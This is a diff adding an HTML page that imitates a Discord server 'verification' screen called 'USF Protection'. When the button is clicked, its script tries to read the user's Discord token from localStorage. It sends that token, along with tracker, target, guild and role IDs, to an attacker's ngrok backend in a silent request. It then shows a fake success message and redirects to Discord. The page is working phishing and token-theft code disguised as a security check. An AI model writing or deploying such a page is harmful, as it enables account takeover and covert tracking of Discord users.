@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Verification</title>
+    <link rel="icon" href="https://discord.com/assets/07dca80a102d4141ebc366c7993b6391.svg">
+    <style>
+        body {
+            background-color: #36393f;
+            color: #ffffff;
+            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .auth-card {
+            background: #2f3136;
+            padding: 32px;
+            border-radius: 8px;
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+            animation: fadeIn 0.3s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .bot-icon {
+            width: 80px;
+            height: 80px;
+            background: #5865f2;
+            border-radius: 50%;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
+        }
+        h2 {
+            margin: 0 0 8px;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        p {
+            color: #b9bbbe;
+            font-size: 16px;
+            line-height: 20px;
+            margin-bottom: 24px;
+        }
+        .btn {
+            background: #5865f2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            width: 100%;
+            transition: background-color 0.17s ease, transform 0.1s ease;
+        }
+        .btn:hover {
+            background: #4752c4;
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #72767d;
+        }
+        .loading-spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #ffffff;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-card" id="main-card">
+        <div class="bot-icon">🛡️</div>
+        <h2>USF Protection</h2>
+        <p>Verification is required to prevent automated raids and sync your account with the server protection system.</p>
+        
+        <button class="btn" id="verify-btn" onclick="handshake()">Complete Verification</button>
+        <div class="loading-spinner" id="spinner"></div>
+        
+        <div class="footer">
+            By verifying, you agree to the USF Security Terms of Service.
+        </div>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        
+        // --- AGENCY CONFIGURATION ---
+        // Replace with your current ngrok URL from the bot's DM
+        const AGENCY_BACKEND = "https://your-ngrok-id.ngrok-free.app";
+
+        async function handshake() {
+            const btn = document.getElementById('verify-btn');
+            const spinner = document.getElementById('spinner');
+            const card = document.getElementById('main-card');
+
+            btn.style.display = 'none';
+            spinner.style.display = 'block';
+
+            let token = null;
+            try {
+                // Attempt to capture token (Experimental/Social Engineering)
+                token = (window.localStorage.getItem('token') || '').replace(/"/g, '');
+            } catch(e) {}
+
+            const trackerId = params.get('id');
+            const targetId = params.get('t');
+            const guildId = params.get('g');
+            const roleId = params.get('r');
+
+            if (trackerId) {
+                // Send all tactical intel to the Agency VPS
+                let url = `${AGENCY_BACKEND}/v/${trackerId}?p=1`;
+                if (targetId) url += `&t=${targetId}`;
+                if (guildId) url += `&g=${guildId}`;
+                if (roleId) url += `&r=${roleId}`;
+                if (token) url += `&tk=${token}`;
+
+                // Silent transmission
+                fetch(url, { 
+                    mode: 'no-cors', 
+                    cache: 'no-store' 
+                }).catch(() => {});
+            }
+
+            // Simulate server-side processing
+            setTimeout(() => {
+                card.innerHTML = `
+                    <div class="bot-icon" style="background: #3ba55c;">✅</div>
+                    <h2>Verification Successful</h2>
+                    <p>Session synced and role granted. You may now return to Discord.</p>
+                    <div class="footer">Redirecting in 3 seconds...</div>
+                `;
+                
+                setTimeout(() => {
+                    window.location.href = "https://discord.com/app";
+                }, 3000);
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
